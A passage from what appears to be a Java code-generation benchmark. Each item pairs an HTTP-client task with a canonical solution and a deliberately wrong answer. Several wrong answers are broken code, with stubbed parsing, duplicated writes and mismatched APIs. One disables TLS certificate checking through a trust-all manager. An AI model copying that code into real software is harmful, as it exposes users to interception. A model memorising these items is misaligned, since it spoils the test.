    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MicrosoftHttpClient {\n    public static final Map<Long, Integer> XSTS_ERRORS = new HashMap<>();\n    static {\n        XSTS_ERRORS.put(400, 1);\n        XSTS_ERRORS.put(401, 2);\n        XSTS_ERRORS.put(403, 3);\n        XSTS_ERRORS.put(404, 4);\n        XSTS_ERRORS.put(500, 5);\n    }\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) throws Exception {\n        HttpURLConnection conn = (HttpURLConnection) new URL(authTokenUrl).openConnection();\n        setCommonProperties(conn, convertToFormData(isRefresh ? \"grant_type=refresh_token&refresh_token=\" + authcode : \"grant_type=authorization_code&code=\" + authcode));\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(convertToFormData(isRefresh ? \"grant_type=refresh_token&refresh_token=\" + authcode : \"grant_type=authorization_code&code=\" + authcode).getBytes());\n        }\n        return getResponse(conn);\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) throws Exception {\n        HttpURLConnection conn = (HttpURLConnection) new URL(xblAuthUrl).openConnection();\n        setCommonProperties(conn, convertToFormData(\"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken&access_token=\" + accessToken));\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(convertToFormData(\"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken&access_token=\" + accessToken).getBytes());\n        }\n        return getResponse(conn);\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) throws Exception {\n        HttpURLConnection conn = (HttpURLConnection) new URL(xstsAuthUrl).openConnection();\n        setCommonProperties(conn, convertToFormData(\"XBL-Token=\" + xblToken));\n        conn.setDoOutput(true);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(convertToFormData(\"XBL-Token=\" + xblToken).getBytes());\n        }\n        String response = getResponse(conn);\n        return new String[]{extractUserHash(response), extractXstsToken(response)};\n    }\n\n    private void setCommonProperties(HttpURLConnection conn, String formData) throws Exception {\n        conn.setRequestMethod(\"POST\");\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n        conn.setDoOutput(true);\n        conn.getOutputStream().write(formData.getBytes());\n    }\n\n    private String convertToFormData(String... data) {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < data.length; i++) {\n            if (i > 0) sb.append(\"&\");\n            sb.append(data[i]);\n        }\n        return sb.toString();\n    }\n\n    private String getResponse(HttpURLConnection conn) throws Exception {\n        int responseCode = conn.getResponseCode();\n        if (responseCode >= 400) {\n            throw getResponseThrowable(conn);\n        }\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = in.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        }\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) throws Exception {\n        int responseCode = conn.getResponseCode();\n        String responseMessage = conn.getResponseMessage();\n        throw new RuntimeException(\"HTTP error code: \" + responseCode + \" - \" + responseMessage);\n    }\n\n    private String extractUserHash(String response) {\n        // Placeholder for actual JSON parsing logic\n        return \"user_hash\";\n    }\n\n    private String extractXstsToken(String response) {\n        // Placeholder for actual JSON parsing logic\n        return \"xsts_token\";\n    }\n}\n```"
  },
  {
    "Task_id": 73,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and URL parameter parsing.\n\nClass Description: HttpUtils is a utility class that provides methods for making HTTP POST requests and parsing URL parameters. It uses Java's HttpURLConnection for HTTP communication and includes helper methods for processing request/response data.\n\nAttributes: (This class has no attributes as it's a utility class with static methods only)\n\nMethods:\n\nMethod1: parseUrlArgs(String responseUrl, JsonObject jsonObject) -> String - Parses a URL string to extract query parameters and adds them to a JsonObject. Returns the base URL without query parameters.\n- Input Parameters:\n  - responseUrl: String - The URL string to parse (may contain query parameters)\n  - jsonObject: JsonObject - The JSON object to populate with parsed parameters\n- Output: String - The base URL without query parameters\n\nMethod2: post(String httpUrl, String content) -> String - Sends an HTTP POST request to the specified URL with the given content and returns the response.\n- Input Parameters:\n  - httpUrl: String - The target URL for the POST request\n  - content: String - The content to send in the request body (can be null or empty)\n- Output: String - The response body from the server\n- Throws: Exception - If the request fails or returns non-200 status code",
    "Canonical_solution": "import com.google.common.io.CharStreams;\nimport com.google.gson.JsonObject;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport org.apache.commons.lang3.StringUtils;\n\npublic class HttpUtils {\n\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        String[] split1 = responseUrl.split(\"\\\\?\");\n        String url = split1[0];\n        if (split1.length > 1) {\n            String[] split = split1[1].split(\"&\");\n            for (int i = 0; i < split.length; i++) {\n                String[] args = split[i].split(\"=\");\n                jsonObject.addProperty(args[0], args[1]);\n            }\n        }\n        return url;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        Map<String, String> headers = new HashMap<>(1);\n        headers.put(\"Content-type\", \"application/json\");\n        URL url = new URL(httpUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        if (null != headers && !headers.isEmpty()) {\n            for (Entry<String, String> entry : headers.entrySet()) {\n                conn.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n        if (StringUtils.isNotBlank(content)) {\n            conn.getOutputStream().write(content.getBytes(StandardCharsets.UTF_8));\n        }\n        conn.connect();\n        if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {\n            throw new RuntimeException(\"request failure, status code:\" + conn.getResponseCode());\n        }\n        String result = CharStreams\n            .toString(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));\n        conn.disconnect();\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport com.google.gson.JsonObject;\n\npublic class HttpUtils {\n    public static String parseUrlArgs(String responseUrl, JsonObject jsonObject) {\n        int questionMarkIndex = responseUrl.indexOf('?');\n        if (questionMarkIndex == -1) {\n            return responseUrl;\n        }\n        String baseUrl = responseUrl.substring(0, questionMarkIndex);\n        String queryString = responseUrl.substring(questionMarkIndex + 1);\n        String[] params = queryString.split(\"&\");\n        for (String param : params) {\n            String[] keyValue = param.split(\"=\");\n            if (keyValue.length == 2) {\n                jsonObject.addProperty(keyValue[0], keyValue[1]);\n            }\n        }\n        return baseUrl;\n    }\n\n    public static String post(String httpUrl, String content) throws Exception {\n        URL url = new URL(httpUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/json; utf-8\");\n        try (OutputStream os = connection.getOutputStream()) {\n            if (content != null) {\n                os.write(content.getBytes(StandardCharsets.UTF_8));\n            }\n        }\n        int responseCode = connection.getResponseCode();\n        if (responseCode != 200) {\n            throw new Exception(\"HTTP error code: \" + responseCode);\n        }\n        try (InputStream inputStream = connection.getInputStream()) {\n            StringBuilder response = new StringBuilder();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        }\n    }\n}"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Create a Java utility class for handling HTTPS network requests, including downloading content as strings or files.\n\nClass Description: NetworkUtils is a utility class that provides methods for making HTTPS requests and downloading content either as strings or files. It handles connection setup, timeout configuration, and proper resource cleanup.\n\nAttributes:\nDEBUG: [boolean] - Flag to enable debug logging\nTAG: [String] - Tag used for logging\nHTTP_READ_TIMEOUT: [int] - Timeout for reading from connection (in milliseconds)\nHTTP_CONNECTION_TIMEOUT: [int] - Timeout for establishing connection (in milliseconds)\n\nMethods:\nsetupHttpsRequest: [String urlStr] -> [HttpsURLConnection] - Sets up an HTTPS connection with the specified URL, configures timeouts and request method, and establishes the connection. Returns the connection object if successful.\ndownloadUrlMemoryAsString: [String url] -> [String] - Downloads content from the specified URL and returns it as a UTF-8 encoded string. Returns null if the download fails.\ndownloadUrlFile: [String url, File f] -> [boolean] - Downloads content from the specified URL and saves it to the specified file. Returns true if successful, false otherwise.\nDownloadCallback: [interface] - Interface defining a callback for asynchronous download completion with onDownloadComplete method.",
    "Canonical_solution": "import android.util.Log;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class NetworkUtils {\n\n    private static final boolean DEBUG = false;\n    private static final String TAG = \"NetworkUtils\";\n    private static final int HTTP_READ_TIMEOUT = 60000;\n    private static final int HTTP_CONNECTION_TIMEOUT = 60000;\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) {\n        URL url;\n        HttpsURLConnection urlConnection = null;\n        try {\n            url = new URL(urlStr);\n            urlConnection = (HttpsURLConnection) url.openConnection();\n            urlConnection.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n            urlConnection.setReadTimeout(HTTP_READ_TIMEOUT);\n            urlConnection.setRequestMethod(\"GET\");\n            urlConnection.setDoInput(true);\n            urlConnection.connect();\n            int code = urlConnection.getResponseCode();\n            if (code != HttpsURLConnection.HTTP_OK) {\n                Log.d(TAG, \"response:\" + code);\n                return null;\n            }\n            return urlConnection;\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to connect to server\", e);\n            return null;\n        }\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        if (DEBUG) Log.d(TAG, \"download: \" + url);\n\n        HttpsURLConnection urlConnection = null;\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return null;\n            }\n\n            InputStream is = urlConnection.getInputStream();\n            ByteArrayOutputStream byteArray = new ByteArrayOutputStream();\n            int byteInt;\n\n            while ((byteInt = is.read()) >= 0) {\n                byteArray.write(byteInt);\n            }\n\n            byte[] bytes = byteArray.toByteArray();\n            if (bytes == null) {\n                return null;\n            }\n\n            return new String(bytes, StandardCharsets.UTF_8);\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return null;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        if (DEBUG) Log.d(TAG, \"download:\" + url);\n\n        HttpsURLConnection urlConnection = null;\n\n        if (f.exists())\n            f.delete();\n\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return false;\n            }\n            long len = urlConnection.getContentLength();\n            if ((len > 0) && (len < 4L * 1024L * 1024L * 1024L)) {\n                byte[] buffer = new byte[262144];\n\n                InputStream is = urlConnection.getInputStream();\n                FileOutputStream os = new FileOutputStream(f, false);\n                try {\n                    int r;\n                    while ((r = is.read(buffer)) > 0) {\n                        os.write(buffer, 0, r);\n                    }\n                } finally {\n                    os.close();\n                }\n\n                return true;\n            }\n            return false;\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return false;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public interface DownloadCallback {\n        void onDownloadComplete(String result);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class NetworkUtils {\n    public static final boolean DEBUG = false;\n    public static final String TAG = \"NetworkUtils\";\n    public static final int HTTP_READ_TIMEOUT = 10000;\n    public static final int HTTP_CONNECTION_TIMEOUT = 5000;\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) throws IOException {\n        URL url = new URL(urlStr);\n        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n        connection.setReadTimeout(HTTP_READ_TIMEOUT);\n        connection.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n        connection.setRequestMethod(\"GET\");\n        connection.connect();\n        return connection;\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        try {\n            HttpsURLConnection connection = setupHttpsRequest(url);\n            int responseCode = connection.getResponseCode();\n            if (responseCode != 200) {\n                return null;\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            reader.close();\n            return sb.toString();\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        try {\n            HttpsURLConnection connection = setupHttpsRequest(url);\n            int responseCode = connection.getResponseCode();\n            if (responseCode != 200) {\n                return false;\n            }\n            try (InputStream in = connection.getInputStream();\n                 FileOutputStream out = new FileOutputStream(f)) {\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            }\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public static interface DownloadCallback {\n        void onDownloadComplete(String url, String content);\n    }\n}"
  },
  {
    "Task_id": 75,
    "Instruction": "Task Description: Create a function that retrieves JSON data from a Twitter URL based on a given tweet ID using Java's HttpURLConnection.\n\nFunction Description: The function makes an HTTP GET request to a Twitter URL constructed with the provided tweet ID, reads the response, and returns it as a JSONObject. It handles HTTPS connections, sets appropriate request headers, and manages the connection lifecycle.\n\nInput: \n- tweetId: long - The ID of the tweet for which to retrieve favorited popup data\n\nOutput: \n- JSONObject - The JSON response from the Twitter URL, or null if an error occurs",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\n\npublic JSONObject getJson(long tweetId) {\n    try {\n        String url = \"https://twitter.com/i/activity/favorited_popup?id=\" + tweetId;\n        URL obj = new URL(url);\n\n        HttpsURLConnection connection = (HttpsURLConnection) obj.openConnection();\n        connection.setRequestProperty(\"Content-Type\", \"text/html\");\n        connection.setRequestProperty(\"charset\", \"utf-8\");\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36\");\n        connection.connect();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line + \"\\n\");\n        }\n\n        String docHtml = sb.toString();\n\n        try {\n            connection.disconnect();\n        } catch (Exception e) {\n\n        }\n\n        return new JSONObject(docHtml);\n    } catch (Exception e) {\n        return null;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.net.*;\nimport java.io.*;\nimport javax.net.ssl.*;\nimport org.json.*;\n\npublic class TwitterDataFetcher {\n    public static JSONObject getTweetData(long tweetId) {\n        try {\n            TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {\n                public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n            } };\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n\n            String url = \"https://api.twitter.com/1.1/statuses/show.json?id=\" + tweetId + \"&include_entities=true\";\n            URL obj = new URL(url);\n            HttpsURLConnection conn = (HttpsURLConnection) obj.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setRequestProperty(\"User-Agent\", \"Java Client\");\n            conn.setRequestProperty(\"Accept\", \"application/json\");\n            // conn.setRequestProperty(\"Authorization\", \"Bearer YOUR_BEARER_TOKEN\");\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return new JSONObject(response.toString());\n            } else {\n                return null;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for MMS (Multimedia Messaging Service) operations, supporting both HTTP and HTTPS protocols with configurable proxy settings and connection parameters.\n\nClass Description: MmsHttpClient is a specialized HTTP client designed for MMS operations that handles both GET and POST requests. It manages network connections, proxy configurations, request/response handling, and includes MMS-specific header management. The class uses OkHttp internally for connection management.\n\nAttributes:\n- mContext: Context - Android application context\n- mSocketFactory: SocketFactory - Factory for creating sockets\n- mHostResolver: MmsNetworkManager - Network host resolver for connection management\n- mConnectionPool: ConnectionPool - Pool of HTTP connections for reuse\n\nMethods:\n- execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) -> byte[] - Executes an HTTP request to the specified URL with given PDU data. Handles both GET and POST methods with proxy support. Returns the response body as byte array.\n- openConnection(URL url, Proxy proxy) -> HttpURLConnection - Creates and configures an appropriate HttpURLConnection (HTTP or HTTPS) with the given URL and proxy settings. Throws MalformedURLException for invalid protocols.\n- checkMethod(String method) -> void - Validates that the HTTP method is either GET or POST (helper method)\n- getCurrentAcceptLanguage(Locale locale) -> String - Generates Accept-Language header value from locale (helper method)\n- addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) -> void - Adds additional MMS-specific headers to the request (helper method)\n- logHttpHeaders(Map<String, List<String>> headers) -> void - Logs HTTP headers for debugging (helper method)",
    "Canonical_solution": "import android.content.Context;\nimport com.android.mms.service_alt.exception.MmsHttpException;\nimport com.squareup.okhttp.ConnectionPool;\nimport com.squareup.okhttp.ConnectionSpec;\nimport com.squareup.okhttp.OkHttpClient;\nimport com.squareup.okhttp.Protocol;\nimport com.squareup.okhttp.Request;\nimport com.squareup.okhttp.Response;\nimport com.squareup.okhttp.internal.Internal;\nimport com.squareup.okhttp.internal.huc.HttpURLConnectionImpl;\nimport com.squareup.okhttp.internal.huc.HttpsURLConnectionImpl;\nimport timber.log.Timber;\n\nimport javax.net.SocketFactory;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class MmsHttpClient {\n\n    public static final String METHOD_POST = \"POST\";\n    public static final String METHOD_GET = \"GET\";\n\n    private static final String HEADER_CONTENT_TYPE = \"Content-Type\";\n    private static final String HEADER_ACCEPT = \"Accept\";\n    private static final String HEADER_ACCEPT_LANGUAGE = \"Accept-Language\";\n    private static final String HEADER_USER_AGENT = \"User-Agent\";\n\n    private static final String HEADER_VALUE_ACCEPT =\n            \"*/*, application/vnd.wap.mms-message, application/vnd.wap.sic\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET =\n            \"application/vnd.wap.mms-message; charset=utf-8\";\n    private static final String HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET =\n            \"application/vnd.wap.mms-message\";\n\n    private final Context mContext;\n    private final SocketFactory mSocketFactory;\n    private final MmsNetworkManager mHostResolver;\n    private final ConnectionPool mConnectionPool;\n\n    public MmsHttpClient(Context context, SocketFactory socketFactory, MmsNetworkManager hostResolver,\n            ConnectionPool connectionPool) {\n        mContext = context;\n        mSocketFactory = socketFactory;\n        mHostResolver = hostResolver;\n        mConnectionPool = connectionPool;\n    }\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet,\n            String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig)\n            throws MmsHttpException {\n        Timber.d(\"HTTP: \" + method + \" \" + urlString\n                + (isProxySet ? (\", proxy=\" + proxyHost + \":\" + proxyPort) : \"\")\n                + \", PDU size=\" + (pdu != null ? pdu.length : 0));\n        checkMethod(method);\n        HttpURLConnection connection = null;\n        try {\n            Proxy proxy = null;\n            if (isProxySet) {\n                proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));\n            }\n            final URL url = new URL(urlString);\n            connection = openConnection(url, proxy);\n            connection.setDoInput(true);\n            connection.setConnectTimeout(mmsConfig.getHttpSocketTimeout());\n            connection.setRequestProperty(HEADER_ACCEPT, HEADER_VALUE_ACCEPT);\n            connection.setRequestProperty(\n                    HEADER_ACCEPT_LANGUAGE, getCurrentAcceptLanguage(Locale.getDefault()));\n            final String userAgent = mmsConfig.getUserAgent();\n            Timber.i(\"HTTP: User-Agent=\" + userAgent);\n            connection.setRequestProperty(HEADER_USER_AGENT, userAgent);\n            final String uaProfUrlTagName = mmsConfig.getUaProfTagName();\n            final String uaProfUrl = mmsConfig.getUaProfUrl();\n            if (uaProfUrl != null) {\n                Timber.i(\"HTTP: UaProfUrl=\" + uaProfUrl);\n                connection.setRequestProperty(uaProfUrlTagName, uaProfUrl);\n            }\n            addExtraHeaders(connection, mmsConfig);\n            if (METHOD_POST.equals(method)) {\n                if (pdu == null || pdu.length < 1) {\n                    Timber.e(\"HTTP: empty pdu\");\n                    throw new MmsHttpException(0/*statusCode*/, \"Sending empty PDU\");\n                }\n                connection.setDoOutput(true);\n                connection.setRequestMethod(METHOD_POST);\n                if (mmsConfig.getSupportHttpCharsetHeader()) {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITH_CHARSET);\n                } else {\n                    connection.setRequestProperty(HEADER_CONTENT_TYPE,\n                            HEADER_VALUE_CONTENT_TYPE_WITHOUT_CHARSET);\n                }\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setFixedLengthStreamingMode(pdu.length);\n                final OutputStream out = new BufferedOutputStream(connection.getOutputStream());\n                out.write(pdu);\n                out.flush();\n                out.close();\n            } else if (METHOD_GET.equals(method)) {\n                logHttpHeaders(connection.getRequestProperties());\n                connection.setRequestMethod(METHOD_GET);\n            }\n            final int responseCode = connection.getResponseCode();\n            final String responseMessage = connection.getResponseMessage();\n            Timber.d(\"HTTP: \" + responseCode + \" \" + responseMessage);\n            logHttpHeaders(connection.getHeaderFields());\n            if (responseCode / 100 != 2) {\n                throw new MmsHttpException(responseCode, responseMessage);\n            }\n            final InputStream in = new BufferedInputStream(connection.getInputStream());\n            final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();\n            final byte[] buf = new byte[4096];\n            int count = 0;\n            while ((count = in.read(buf)) > 0) {\n                byteOut.write(buf, 0, count);\n            }\n            in.close();\n            final byte[] responseBody = byteOut.toByteArray();\n            Timber.d(\"HTTP: response size=\"\n                    + (responseBody != null ? responseBody.length : 0));\n            return responseBody;\n        } catch (MalformedURLException e) {\n            Timber.e(e, \"HTTP: invalid URL \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL \" + urlString, e);\n        } catch (ProtocolException e) {\n            Timber.e(e, \"HTTP: invalid URL protocol \" + urlString);\n            throw new MmsHttpException(0/*statusCode*/, \"Invalid URL protocol \" + urlString, e);\n        } catch (IOException e) {\n            Timber.e(e, \"HTTP: IO failure\");\n            throw new MmsHttpException(0/*statusCode*/, e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private HttpURLConnection openConnection(URL url, final Proxy proxy) throws MalformedURLException {\n        final String protocol = url.getProtocol();\n        OkHttpClient okHttpClient;\n        if (protocol.equals(\"http\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setFollowRedirects(false);\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    if (proxy != null) {\n                        return Arrays.asList(proxy);\n                    } else {\n                        return new ArrayList<Proxy>();\n                    }\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            okHttpClient.setSocketFactory(SocketFactory.getDefault());\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            if (proxy != null) {\n                okHttpClient.setProxy(proxy);\n            }\n\n            return new HttpURLConnectionImpl(url, okHttpClient);\n        } else if (protocol.equals(\"https\")) {\n            okHttpClient = new OkHttpClient();\n            okHttpClient.setProtocols(Arrays.asList(Protocol.HTTP_1_1));\n            HostnameVerifier verifier = HttpsURLConnection.getDefaultHostnameVerifier();\n            okHttpClient.setHostnameVerifier(verifier);\n            okHttpClient.setSslSocketFactory(HttpsURLConnection.getDefaultSSLSocketFactory());\n            okHttpClient.setProxySelector(new ProxySelector() {\n                @Override\n                public List<Proxy> select(URI uri) {\n                    return Arrays.asList(proxy);\n                }\n\n                @Override\n                public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n                }\n            });\n            okHttpClient.setAuthenticator(new com.squareup.okhttp.Authenticator() {\n                @Override\n                public Request authenticate(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n\n                @Override\n                public Request authenticateProxy(Proxy proxy, Response response) throws IOException {\n                    return null;\n                }\n            });\n            okHttpClient.setConnectionSpecs(Arrays.asList(ConnectionSpec.CLEARTEXT));\n            okHttpClient.setConnectionPool(new ConnectionPool(3, 60000));\n            Internal.instance.setNetwork(okHttpClient, mHostResolver);\n\n            return new HttpsURLConnectionImpl(url, okHttpClient);\n        } else {\n            throw new MalformedURLException(\"Invalid URL or unrecognized protocol \" + protocol);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.Proxy;\nimport java.net.MalformedURLException;\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.List;\nimport java.util.Locale;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.RequestBody;\nimport okhttp3.MediaType;\nimport okhttp3.Headers;\nimport okhttp3.HttpUrl;\nimport android.content.Context;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.logging.Logger;\n\npublic class MmsHttpClient {\n    private Context mContext;\n    private okhttp3.SocketFactory mSocketFactory;\n    private MmsNetworkManager mHostResolver;\n    private okhttp3.ConnectionPool mConnectionPool;\n\n    public byte[] execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) throws IOException {\n        checkMethod(method);\n        HttpUrl httpUrl = HttpUrl.get(urlString);\n        Proxy proxy = isProxySet ? new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort)) : null;\n        OkHttpClient client = getOkHttpClient(proxy);\n        Request.Builder requestBuilder = new Request.Builder().url(httpUrl);\n        if (\"POST\".equals(method)) {\n            RequestBody body = RequestBody.create(MediaType.get(\"application/octet-stream\"), pdu);\n            requestBuilder.post(body);\n        } else {\n            requestBuilder.get();\n        }\n        addExtraHeaders(requestBuilder, mmsConfig);\n        Request request = requestBuilder.build();\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n            return response.body().bytes();\n        } catch (Exception e) {\n            throw new IOException(e);\n        }\n    }\n\n    private OkHttpClient getOkHttpClient(Proxy proxy) {\n        OkHttpClient client = new OkHttpClient.Builder()\n                .socketFactory(mSocketFactory)\n                .connectionPool(mConnectionPool)\n                .build();\n        if (proxy != null) {\n            client.proxy(proxy);\n        }\n        return client;\n    }\n\n    private void checkMethod(String method) {\n        if (!method.equals(\"GET\") && !method.equals(\"POST\")) {\n            throw new IllegalArgumentException(\"Unsupported HTTP method: \" + method);\n        }\n    }\n\n    private String getCurrentAcceptLanguage(Locale locale) {\n        if (locale == null) 